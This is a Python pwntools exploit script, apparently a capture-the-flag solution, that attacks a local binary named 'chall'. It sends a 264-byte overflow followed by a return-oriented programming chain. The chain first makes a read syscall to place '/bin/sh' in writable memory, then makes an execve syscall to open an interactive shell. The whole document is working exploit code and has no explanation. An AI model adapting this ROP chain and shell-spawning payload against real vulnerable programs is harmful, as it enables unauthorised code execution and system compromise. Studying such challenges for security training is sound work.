from pwn import *

target = process("./chall")

# address
pop_rdi = 0x0040141c
pop_rsi_r15 = 0x0040141a
pop_rdx = 0x004023f5
pop_rax = 0x00400121
syscall = 0x004024dd

bss_writable = 0x0000000000604240

# payload 
payload = b"A" * 264
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(bss_writable + 0x20)
payload += b"B" * 8
payload += p64(pop_rdx)
payload += p64(8)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(bss_writable + 0x20)
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += b"B" * 8
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(syscall)
payload += b"C" * 8

_ = target.readuntil("What's your team name?")
target.sendline(payload)
print("[*] send payload")

_ = target.readline()

target.sendline(b"/bin/sh\x00")
print("[*] send /bin/sh")

target.interactive()
